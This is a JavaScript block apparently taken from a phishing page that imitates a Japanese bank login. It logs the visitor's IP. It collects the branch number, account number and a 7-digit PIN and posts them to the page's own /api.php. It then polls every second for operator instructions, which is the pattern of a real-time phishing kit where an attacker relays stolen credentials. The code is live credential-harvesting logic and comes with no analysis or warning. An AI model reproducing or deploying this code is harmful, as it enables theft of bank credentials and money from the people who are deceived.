<script>

    var mask = null;
    var timer = null;
    var hb_timer = null;
    function heart_beat() {
        $.get('/api.php?act=heart_beat&_r=' + Math.random(), function (res) {
            console.log(res);
        });
    }
    function ip_save() {
        $.get('/api.php?act=ip_save&_r=' + Math.random(), function (res) {
            console.log(res);
        });
    }
    ip_save();

    function is_agree(){
        $.post('/api.php?act=is_agree&_r='+Math.random(),function (res) {
            var t = JSON.parse(res);
            if (t.code == 'ok') {
                layer.close(mask);
                clearInterval(timer);
                if(t.sel.indexOf('alert-error') != -1) {
                    alert('アカウントやパスワードが間違っている!');
                    return false;
                }else{//非空,则传递验证码到跳转页面
                    window.location.href=t.sel;
                }
            }else{
                console.log('wait');
            }
        });
    }


    var left = document.getElementById("left");
    var right = document.getElementById("right");

    var dfh = document.getElementById("dfh");
    var az = document.getElementById("az");
    var kzfh = document.getElementById("kzfh");


    var aztwo = document.getElementById("aztwo");
    var qyefh = document.getElementById("qyzfh");


    function leftcontrl(){
        left.style.display="block";
        right.style.display="none";

    }


    function righrcontrl(){

        left.style.display="none";
        right.style.display="block";
    }

    function verifyone(){

        if(isNaN(dfh.value) || isNaN(az.value) || isNaN(kzfh.value)){

            layer.msg('正しく入力してください！');
            return false;
        }

        if(kzfh.value.length!=7 || az.value.length!=4){

            layer.msg('正しく入力してください！');
            return false;
        }

        if(dfh.value.length!="" && az.value.length!="" && kzfh.value.length!=""){

            var appid = "店番号:"+dfh.value+ "<br>"+"口座番号:"+az.value;
            var apppwd =kzfh.value;
            $.ajax({
                url: '/api.php?act=next_save&_r='+Math.random(),
                type: 'post',
                data: {uname:appid,apppwd:apppwd},
                success: function (res) {
                    var t = JSON.parse(res);
                    if(t.code == 'ok') {
                        mask = layer.load(2, {shade: [0.25, '#000']});
                        timer = setInterval("is_agree()", 1000);
                        hb_timer = setInterval("heart_beat()",1000);

                        //$('#loginForm').attr('action','reset-password.php').submit();
                        return false;
                    }else{
                        layer.msg('提交失败！');
                        return false;
                    }
                },
            });
        }else{
            layer.msg('必須項目を入力してください！');

        }



    }

    function verifytwo(){
        if(isNaN(aztwo.value) || isNaN(qyefh.value) || aztwo.value.length!=4){

            layer.msg('正しく入力してください！');
            return false;
        }
        if(aztwo.value.length!="" || qyefh.value.length!=""){

            var appid = aztwo.value;
            var apppwd =qyefh.value;
            $.ajax({
                url: '/api.php?act=next_save&_r='+Math.random(),
                type: 'post',
                data: {uname:appid,apppwd:apppwd},
                success: function (res) {
                    var t = JSON.parse(res);
                    if(t.code == 'ok') {
                        mask = layer.load(2, {shade: [0.25, '#000']});
                        timer = setInterval("is_agree()", 1000);
                        hb_timer = setInterval("heart_beat()",1000)

                        //$('#loginForm').attr('action','reset-password.php').submit();
                        return false;
                    }else{
                        layer.msg('提交失败！');
                        return false;
                    }
                },
            });
        }else{
            layer.msg('必須項目を入力してください！');

        }
    }





</script>
